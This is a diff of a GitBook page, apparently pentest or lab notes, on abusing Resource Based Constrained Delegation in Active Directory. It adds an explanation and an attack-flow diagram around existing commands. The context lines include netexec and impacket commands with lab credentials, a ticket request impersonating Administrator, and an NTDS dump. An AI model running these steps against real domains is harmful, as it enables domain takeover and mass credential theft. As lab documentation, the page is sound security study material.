@@ -1,13 +1,45 @@
 ---
+description: >-
+  Instead of the domain admin configuring who can delegate, the target computer
+  controls who is allowed to impersonate users to it.
 metaLinks:
   alternates:
     - >-
       https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/kerberos-attack/resource-based-constrained-delegation
 ---
 
-# Resource Based Constrained Delegation
+# Resource Based Constrained Delegation (RBCD)
 
-<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+**The Attribute That Makes It Work**
+
+Every computer object has an attribute called:
+
+```
+msDS-AllowedToActOnBehalfOfOtherIdentity
+```
+
+This is just a list that says:
+
+> _"I (the target computer) trust these accounts to impersonate anyone to me"_
+
+If you can **write to this attribute** on a computer object → you can abuse RBCD.
+
+**The Attack Flow**
+
+```bash
+You have WriteProperty on VICTIM-PC$
+         ↓
+Create a fake computer account (ATTACKER-PC$)
+         ↓
+Write ATTACKER-PC$ into VICTIM-PC$'s msDS-AllowedToActOnBehalfOf...
+         ↓
+Use S4U2Self + S4U2Proxy to get a ticket
+impersonating Administrator → VICTIM-PC$
+         ↓
+PSExec / WinRM in as Administrator 🎉
+```
+
+<figure><img src="../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Terence.white have WriteAccountRestrictions
 
@@ -23,7 +55,7 @@ nxc ldap 192.168.178.187 -u 'alex.turner' -p 'alex1988' -M maq
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 We check for pre-Windows 2000 accounts
 
@@ -33,7 +65,7 @@ nxc ldap 192.168.178.187 -u 'alex.turner' -p 'alex1988' -M pre2k
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 We configure RBCD on the domain controller
 
@@ -51,7 +83,7 @@ getST.py -spn cifs/DC01.grandstay.local -impersonate Administrator -dc-ip 192.16
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```bash
@@ -59,8 +91,6 @@ export KRB5CCNAME=Administrator@cifs_DC01.grandstay.local@GRANDSTAY.LOCAL.ccache
 nxc smb 192.168.178.187 -k --use-kcache -u Administrator --ntds
 ```
 {% endcode %}
-
-
 
 ## Abuse by Windows System
 
